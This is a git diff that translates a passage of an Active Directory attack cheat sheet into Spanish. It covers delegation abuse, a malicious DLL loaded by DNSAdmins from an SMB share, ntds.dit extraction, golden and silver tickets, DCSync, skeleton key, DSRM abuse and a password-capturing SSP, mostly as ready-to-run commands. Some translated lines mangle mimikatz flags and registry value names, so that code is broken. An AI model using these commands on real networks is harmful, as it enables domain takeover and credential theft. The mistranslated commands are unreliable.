 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
 $SD.GetBinaryForm($SDBytes, 0)
 
-#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
+#A continuación, necesitamos configurar el descriptor de seguridad en el campo msDS-AllowedToActOnBehalfOfOtherIdentity de la cuenta de equipo que vamos a controlar, nuevamente usando PowerView
 Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 
-#After that we need to get the RC4 hash of the new machine account's password using Rubeus
+#Después, necesitamos obtener el hash RC4 de la contraseña de la nueva cuenta de la máquina usando Rubeus
 Rubeus.exe hash /password:'p@ssword!'
 
-#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
+#Para este ejemplo, suplantaremos al administrador del dominio en el servicio CIF del equipo objetivo usando Rubeus:
 Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
 
-#Finally we can access the C$ drive of the target machine
+#Finalmente, podemos acceder a la unidad C$ del equipo objetivo:
 dir \\TargetMachine.wtver.domain\C$
 ```
 
-Detailed Articles:
+Artículos detallados:
 
-- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
-- [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)
+- [Wagging the Dog: Abusar de la delegación restringida basada en recursos para atacar Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
+- [DELEGACIÓN RESTRINADA BASADA EN RECURSOS ABUSO](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)
 
-:exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.
+En la Delegación Restringida Basada en Recursos y Restricción, si no tenemos la contraseña/hash de la cuenta con TRUSTED_TO_AUTH_FOR_DELEGATION que intentamos abusar, podemos usar el ingenioso truco "tgt::deleg" de kekeo o "tgtdeleg" de rubeus y engañar a Kerberos para que nos proporcione un TGT válido para esa cuenta. Luego, simplemente usamos el ticket en lugar del hash de la cuenta para realizar el ataque.
 
 ```powershell
-#Command on Rubeus
+#Comando en Rubeus
 Rubeus.exe tgtdeleg /nowrap
 ```
 
-Detailed Article:
-[Rubeus – Now With More Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)
+Artículo detallado:
+[Rubeus – Ahora con más Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)
 
-### DNSAdmins Abuse
+### Abuso de DNSAdmins
 
-_WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._
+_¿QUÉ ES DIS?: Si un usuario es miembro del grupo DNSAdmins, podría cargar una DLL arbitraria con los privilegios de dns.exe que se ejecuta como SYSTEM. Si el controlador de dominio sirve un DNS, el usuario puede escalar sus privilegios a DA. Este proceso de explotación requiere privilegios para reiniciar el servicio DNS y funcionar._
 
-1. Enumerate the members of the DNSAdmins group:
-   - PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
-   - AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
-2. Once we found a member of this group we need to compromise it (There are many ways).
-3. Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:
+1. Enumere los miembros del grupo DNSAdmins:
+- PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
+- Módulo AD: `Get-ADGroupMember -Identiny DNSAdmins`
+2. Una vez encontrado un miembro de este grupo, debemos comprometerlo (hay varias maneras). 3. Luego, al servir una DLL maliciosa en un recurso compartido SMB y configurar su uso, podemos escalar nuestros privilegios:
 
-   ```powershell
-   #Using dnscmd:
-   dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
+```powershell
+#Usando dnscmd:
+dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
 
-   #Restart the DNS Service:
-   sc \\DNSServer stop dns
-   sc \\DNSServer start dns
-   ```
+#Reiniciar el servicio DNS:
+sc \\DNSServer stop dns
+sc \\DNSServer start dns
+```
 
-### Abusing Active Directory-Integraded DNS
+### Abuso de DNS integrado en Active Directory
 
-- [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
-- [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
+- [Explotación de DNS integrado en Active Directory](https://blog.netspi.com/exploiting-adidns/)
+- [ADIDNS revisitado](https://blog.netspi.com/adidns-revisited/)
 - [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
 
-### Abusing Backup Operators Group
+### Abuso del grupo de operadores de backup
 
-_WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
-group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC,
-extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._
+¿Qué es DIS?: Si logramos comprometer una cuenta de usuario que pertenece al grupo de operadores de backup, podemos abusar de su privilegio SeBackup para crear una instantánea del estado actual del controlador de dominio, extraer el archivo de base de datos ntds.dit, volcar los hashes y escalar nuestros privilegios al administrador de dominio.
 
-1. Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:
+1. Una vez que tengamos acceso a una cuenta con el privilegio SeBackup, podemos acceder al controlador de dominio y crear una instantánea usando el binario firmado diskshadow:
 
-   ```powershell
-   #Create a .txt file that will contain the shadow copy process script
-   Script ->{
-   set context persistent nowriters
-   set metadata c:\windows\system32\spool\drivers\color\example.cab
-   set verbose on
-   begin backup
-   add volume c: alias mydrive
+```powershell
+#Crear un archivo .txt que contendrá el script del proceso de instantánea
+Script ->{
+set context persistent nowriters
+set metadata c:\windows\system32\spool\drivers\color\example.cab
+set verbose on
+begin backup
+add volume c: alias mydrive
 
-   create
+create
 
-   expose %mydrive% w:
-   end backup
-   }
+expose %mydrive% w:
+end backup
+}
 
-   #Execute diskshadow with our script as parameter
-   diskshadow /s script.txt
-   ```
+#Ejecutar diskshadow con nuestro script como parámetro
+diskshadow /s script.txt
+```
 
-2. Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
-   simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
-   going to use [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:
+2. A continuación, necesitamos acceder a la instantánea. Si bien podemos tener el privilegio SeBackup, no podemos simplemente copiar y pegar ntds.dit. Necesitamos imitar un software de respaldo y usar llamadas a la API de Win32 para copiarlo en una carpeta accesible. Para esto, usaremos este increíble repositorio [https://github.com/giuliano108/SeBackupPrivilege]:
 
-   ```powershell
-   #Importing both dlls from the repo using powershell
-   Import-Module .\SeBackupPrivilegeCmdLets.dll
-   Import-Module .\SeBackupPrivilegeUtils.dll
+```powershell
+#Importando ambas DLL desde el repositorio con PowerShell
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
 
-   #Checking if the SeBackupPrivilege is enabled
-   Get-SeBackupPrivilege
+#Comprobando si SeBackupPrivilege está habilitado
+Get-SeBackupPrivilege
 
-   #If it isn't we enable it
-   Set-SeBackupPrivilege
+#Si no lo está, lo habilitamos
+Set-SeBackupPrivilege
 
-   #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
-   Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
+#Usando la funcionalidad de las DLL para copiar el archivo de base de datos ntds.dit desde la instantánea a la ubicación que elijamos
+Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
 
-   #Dump the SYSTEM hive
-   reg save HKLM\SYSTEM c:\temp\system.hive
-   ```
+#Volcar la sección SYSTEM
+reg save HKLM\SYSTEM c:\temp\system.hive
+```
 
-3. Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
-4. Use secretsdump.py from impacket and dump the hashes.
-5. Use psexec or another tool of your choice to PTH and get Domain Admin access.
+3. Usando smbclient.py de impacket u otra herramienta, copiamos ntds.dit y el subárbol SYSTEM en nuestra máquina local.
+4. Usando secretsdump.py de impacket y volcamos los hashes.
+5. Usando psexec u otra herramienta de su elección para PTH y obtener acceso de administrador de dominio.
 
-### Abusing Exchange
+### Abuso de Exchange
 
-- [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
+- [Abusar de una llamada a la API de Exchange desde DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 - [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
-- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange
+- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Intercambiar privilegios por privilegios de administrador de dominio abusando de Exchange
 
-### Weaponizing Printer Bug
+### Armar un error de impresora
 
-- [Printer Server Bug to Domain Administrator](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
+- [Error del servidor de impresión al administrador de dominio](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
 - [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
 
-### Abusing ACLs
+### Abuso de ACL
 
-- [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+- [Escalar privilegios con ACL en Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 - [aclpwn.py](https://github.com/fox-it/aclpwn.py)
 - [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)
 
-### Abusing IPv6 with mitm6
+### Abuso de IPv6 con mitm6
 
-- [Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+- [Comprometer redes IPv4 a través de IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
 - [mitm6](https://github.com/fox-it/mitm6)
 
-### SID History Abuse
+### Abuso del historial de SID
 
-_WUT IS DIS?: If we manage to compromise a child domain of a forest and [SID filtering](https://www.itprotoday.com/windows-8/sid-filtering) isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the [SID History](https://www.itprotoday.com/windows-8/sid-history) field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._
+¿Qué es esto?: Si logramos comprometer un dominio secundario de un bosque y el filtrado de SID no está habilitado (generalmente no lo está), podemos abusar de él para escalar privilegios al administrador del dominio raíz del bosque. Esto es posible gracias al campo [Historial de SID](https://www.itprotoday.com/windows-8/sid-history) en un ticket TGT de Kerberos, que define los grupos de seguridad y privilegios adicionales.
 
-Exploitation example:
+Ejemplo de explotación:
 
 ```powershell
-#Get the SID of the Current Domain using PowerView
+#Obtener el SID del dominio actual con PowerView
 Get-DomainSID -Domain current.root.domain.local
 
-#Get the SID of the Root Domain using PowerView
+#Obtener el SID del dominio raíz con PowerView
 Get-DomainSID -Domain root.domain.local
 
-#Create the Enteprise Admins SID
-Format: RootDomainSID-519
+#Crear el SID de los administradores empresariales
+Formato: RootDomainSID-519
 
-#Forge "Extra" Golden Ticket using mimikatz
-kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi
+#Forjar el Golden Ticket adicional con mimikatz
+kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<SID del administrador empresarial> /desplazamiento inicial:0 /entrada final:600 /máximo de renovación:10080 /ticket:\ruta\a\ticket\golden.kirbi
 
-#Inject the ticket into memory
+#Inyectar el ticket en memoria
 kerberos::ptt \path\to\ticket\golden.kirbi
 
-#List the DC of the Root Domain
+#Listar el controlador de dominio del dominio raíz
 dir \\dc.root.domain.local\C$
 
-#Or DCsync and dump the hashes using mimikatz
+#O sincronizar con DC y volcar los hashes usando mimikatz
 lsadump::dcsync /domain:root.domain.local /all
 ```
 
-Detailed Articles:
+Artículos detallados:
 
-- [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
-- [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
+- [Los tickets dorados de Kerberos ahora son más dorados](https://adsecurity.org/?p=1640)
+- [Guía para atacar las confianzas de dominio](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
 
-### Exploiting SharePoint
+### Explotación de SharePoint
 
-- [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation \
-  [PoC](https://github.com/k8gege/CVE-2019-0604)
-- [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Code execution through BDC deserialization
-- [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters \
-  [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)
+- [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) Explotación de RCE \
+[PoC](https://github.com/k8gege/CVE-2019-0604)
+- [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Ejecución de código mediante deserialización de BDC
+- [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) Ejecución remota de código (RCE) mediante convertidores de tipos
+
+[Prueba de concepto](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)
 
 ### Zerologon
 
-- [Zerologon: Unauthenticated domain controller compromise](https://www.secura.com/whitepapers/zerologon-whitepaper): White paper of the vulnerability.
-- [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C# implementation of the Zerologon exploit.
-- [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): PowerShell implementation of the Zerologon exploit.
-- [Zer0Dump](https://github.com/bb00/zer0dump): Python implementation of the Zerologon exploit using the impacket library.
+- [Zerologon: Compromiso de controlador de dominio no autenticado](https://www.secura.com/whitepapers/zerologon-whitepaper): Informe técnico de la vulnerabilidad.
+
+- [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): Implementación en C# del exploit Zerologon. - [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): Implementación en PowerShell del exploit Zerologon.
+- [Zer0Dump](https://github.com/bb00/zer0dump): Implementación en Python del exploit Zerologon usando la biblioteca impacket.
 
 ### PrintNightmare
 
-- [CVE-2021-34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527): Vulnerability details.
-- [Impacket implementation of PrintNightmare](https://github.com/cube0x0/CVE-2021-1675): Reliable PoC of PrintNightmare using the impacket library.
-- [C# Implementation of CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Reliable PoC of PrintNightmare written in C#.
+- [CVE-2021-34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527): Detalles de la vulnerabilidad.
+- [Implementación de PrintNightmare con Impacket](https://github.com/cube0x0/CVE-2021-1675): Prueba de concepto (PoC) fiable de PrintNightmare usando la biblioteca impacket. - [Implementación de CVE-2021-1675 en C#](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Prueba de concepto fiable de PrintNightmare escrita en C#.
 
-### Active Directory Certificate Services
+### Servicios de certificados de Active Directory
 
-**Check for Vulnerable Certificate Templates with:** [Certify](https://github.com/GhostPack/Certify)
+**Comprobar plantillas de certificado vulnerables con:** [Certify](https://github.com/GhostPack/Certify)
 
-_Note: Certify can be executed with Cobalt Strike's `execute-assembly` command as well_
+_Nota: Certify también se puede ejecutar con el comando `execute-assembly` de Cobalt Strike_
 
 ```powershell
 .\Certify.exe find /vulnerable /quiet
 ```
 
-Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights
-allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.
+Asegúrese de que el valor de msPKI-Certificates-Name-Flag esté establecido en "ENROLLEE_SUPPLIES_SUBJECT" y que los derechos de inscripción permitan usuarios de dominio/autenticados. Además, compruebe que el parámetro pkiextendedkeyusage contenga el valor "Autenticación de cliente" y que el parámetro "Firmas autorizadas requeridas" esté establecido en 0.
 
-This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA")
-and use the captured certificate with Rubeus to forge authentication.
+Este exploit solo funciona porque esta configuración habilita la autenticación de servidor/cliente, lo que significa que un atacante puede especificar el UPN de un administrador de dominio (DA) y usar el certificado capturado con Rubeus para falsificar la autenticación.
 
-_Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target._
+Nota: Si un administrador de dominio pertenece a un grupo de usuarios protegidos, el exploit podría no funcionar correctamente. Compruébelo antes de elegir un DA como objetivo.
 
-Request the DA's Account Certificate with Certify
+Solicitar el certificado de cuenta del DA con Certify
 
 ```powershell
-.\Certify.exe request /template:<Template Name> /quiet /ca:"<CA Name>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine
+.\Certify.exe request /template:<Nombre de la plantilla> /quiet /ca:"<Nombre de la CA>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Nombre alternativo del administrador de dominio> /machine
 ```
 
-This should return a valid certificate for the associated DA account.
+Esto debería devolver un certificado válido para la cuenta del DA asociada.
 
-The exported `cert.pem` and `cert.key` files must be consolidated into a single `cert.pem` file, with one gap of whitespace between the `END RSA PRIVATE KEY` and the `BEGIN CERTIFICATE`.
+Los archivos `cert.pem` y `cert.key` exportados deben consolidarse en un solo archivo `cert.pem`, con un espacio entre `END RSA PRIVATE KEY` y `BEGIN CERTIFICATE`.
 
-_Example of `cert.pem`:_
+_Ejemplo de `cert.pem`:_
 
 ```
 -----BEGIN RSA PRIVATE KEY-----
@@ -1132,237 +1120,237 @@ BIIEogIBOmgAwIbSe[...]
 -----END CERTIFICATE-----
 ```
 
-#Utilize `openssl` to Convert to PKCS #12 Format
+#Utilizar `openssl` para convertir al formato PKCS #12
 
-The `openssl` command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).
+El comando `openssl` permite convertir el archivo de certificado al formato PKCS #12 (es posible que se le solicite una contraseña de exportación, que puede ser la que desee).
 
 ```bash
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
-Once the `cert.pfx` file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, `certutil.exe`, Cobalt Strike's upload functionality, etc.)
+Una vez exportado el archivo `cert.pfx`, cárguelo al host comprometido (esto se puede hacer de diversas maneras, como con PowerShell, SMB, `certutil.exe`, la función de carga de Cobalt Strike, etc.).
 
-After the `cert.pfx` file has been uploaded to the compromised host, [Rubeus](https://github.com/GhostPack/Rubeus) can be used to request a Kerberos TGT for the DA account which will then be imported into memory.
+Después de cargar el archivo `cert.pfx` al host comprometido, se puede usar [Rubeus](https://github.com/GhostPack/Rubeus) para solicitar un TGT de Kerberos para la cuenta DA, que luego se importará a la memoria.
 
 ```powershell
-.\Rubeus.exe asktht /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt
+.\Rubeus.exe asktht /user:<Nombre alternativo del administrador del dominio> /domain:<dominio.com> /dc:<IP o nombre de host del controlador de dominio> /certificate:<Ruta de la máquina local a cert.pfx> /nowrap /ptt
 ```
 
-This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.
+Esto debería generar un ticket importado correctamente, lo que permite a un atacante realizar diversas actividades maliciosas en el contexto del usuario DA, como un ataque DCSync.
 
-### No PAC
+### Sin PAC
 
-- [sAMAccountname Spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) Exploitation of CVE-2021-42278 and CVE-2021-42287
-- [Weaponisation of CVE-2021-42287/CVE-2021-42278](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html) Exploitation of CVE-2021-42278 and CVE-2021-42287
-- [noPAC](https://github.com/cube0x0/noPac) C# tool to exploit CVE-2021-42278 and CVE-2021-42287
-- [sam-the-admin](https://github.com/WazeHell/sam-the-admin) Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287
-- [noPac](https://github.com/Ridter/noPac) Evolution of "sam-the-admin" tool
+- [Suplantación de nombre de cuenta sAMA](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) Explotación de CVE-2021-42278 y CVE-2021-42287
+- [Armamentización de CVE-2021-42287/CVE-2021-42278](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html) Explotación de CVE-2021-42278 y CVE-2021-42287
+- [noPAC](https://github.com/cube0x0/noPac) Herramienta de C# para explotar CVE-2021-42278 y CVE-2021-42287
+- [sam-the-admin](https://github.com/WazeHell/sam-the-admin) Herramienta automatizada de Python para explotar CVE-2021-42278 y CVE-2021-42287
+- [noPac](https://github.com/Ridter/noPac) Evolución de la herramienta "sam-the-admin"
 
-## Domain Persistence
+## Persistencia de Dominio
 
-### Golden Ticket Attack
+### Ataque Golden Ticket
 
 ```powershell
-#Execute mimikatz on DC as DA to grab krbtgt hash:
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>
+#Ejecutar mimikatz en el controlador de dominio como DA para obtener el hash krbtgt:
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Nombre del controlador de dominio>
 
-#On any machine:
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
-<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+#En cualquier máquina:
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Nombre del dominio> /sid:<SID del dominio> /krbtgt:
+<HashOfkrbtgtAccount> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
-### DCsync Attack
+### Ataque DCsync
 
 ```powershell
-#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
+#DCsync usando mimikatz (Se necesitan permisos de DA o privilegios DS-Replication-Get-Changes y DS-Replication-Get-Changes-All):
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'
 
-#DCsync using secretsdump.py from impacket with NTLM authentication
-secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm
+#DCsync usando secretsdump.py de impacket con autenticación NTLM
+secretsdump.py <Dominio>/<Nombre de usuario>:<Contraseña>@<IP o FQDN del DC> -just-dc-ntlm
 
-#DCsync using secretsdump.py from impacket with Kerberos Authentication
-secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
+#DCsync usando secretsdump.py de impacket con Kerberos Autenticación
+secretsdump.py -no-pass -k <Dominio>/<Nombre de usuario>@<IP o FQDN del controlador de dominio> -just-dc-ntlm
 ```
 
-**Tip:** \
- /ptt -> inject ticket on current running session \
- /ticket -> save the ticket on the system for later use
+**Consejo:** \
+/ptt -> inyectar ticket en la sesión actual \
+/ticket -> guardar el ticket en el sistema para su uso posterior
 
-### Silver Ticket Attack
+### Ataque de ticket Silver
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
-<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /domain:<Nombre de dominio> /sid:<SID del dominio> /target:<La máquina de destino> /service:
+<Tipo de servicio> /rc4:<Hash NTLM de la cuenta del SPN> /user:<Usuario al que suplantar> /ptt"'
 ```
 
-[SPN List](https://adsecurity.org/?page_id=183)
+[Lista de SPN](https://adsecurity.org/?page_id=183)
 
-### Skeleton Key Attack
+### Ataque de llave maestra
 
 ```powershell
-#Exploitation Command runned as DA:
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>
+#Comando de explotación ejecutado como DA:
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <FQDN del DC>
 
-#Access using the password "mimikatz"
+#Acceso con la contraseña "mimikatz"
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
 
-### DSRM Abuse
+### Abuso de DSRM
 
-_WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_
+_¿QUÉ ES DIS?: Cada DC tiene una cuenta de administrador local. Esta cuenta tiene la contraseña DSRM, que es SafeBackupPassword. Podemos obtener esto y luego pasar por PTH su hash NTLM para obtener acceso de administrador local al controlador de dominio.
 
 ```powershell
-#Dump DSRM password (needs DA privs):
-Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>
+#Volcar la contraseña DSRM (requiere privilegios del DA):
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <Nombre del controlador de dominio>
 
-#This is a local account, so we can PTH and authenticate!
-#BUT we need to alter the behaviour of the DSRM account before pth:
-#Connect on DC:
-Enter-PSSession -ComputerName <DC's Name>
+#Esta es una cuenta local, por lo que podemos pasar por PTH y autenticarnos.
 
-#Alter the Logon behaviour on registry:
+#PERO necesitamos modificar el comportamiento de la cuenta DSRM antes de realizar el PTH:
+#Conectar al controlador de dominio:
+Enter-PSSession -ComputerName <Nombre del controlador de dominio>
+
+#Modificar el comportamiento de inicio de sesión en el registro:
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose
 
-#If the property already exists:
+#Si la propiedad ya existe:
 Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
 ```
 
-Then just PTH to get local admin access on DC!
+¡Entonces, solo realiza el PTH para obtener acceso de administrador local al controlador de dominio!
 
-### Custom SSP
+### SSP personalizado
 
-_WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!_
+¿QUÉ ES ESTO?: Podemos configurar nuestro SSP descargando una DLL personalizada, por ejemplo, mimilib.dll de mimikatz, que monitorizará y capturará las contraseñas de texto plano de los usuarios que hayan iniciado sesión.
 
-From powershell:
+Desde PowerShell:
 
 ```powershell
-#Get current Security Package:
-$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'
+#Obtener el paquete de seguridad actual:
+$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty 'Paquetes de Seguridad'
 
-#Append mimilib:
+#Añadir mimilib:
 $packages += "mimilib"
 
-#Change the new packages name
-Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
-Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages
+#Cambiar el nombre de los nuevos paquetes
+Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Paquetes de Seguridad' -Value $packages
+Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Paquetes de Seguridad' -Value $packages
 
-#ALTERNATIVE:
+#ALTERNATIVA:
 Invoke-Mimikatz -Command '"misc::memssp"'
 ```
 
-Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log
+Ahora todos los inicios de sesión en el controlador de dominio se registran en -> C:\Windows\System32\kiwissp.log
 
-## Cross Forest Attacks
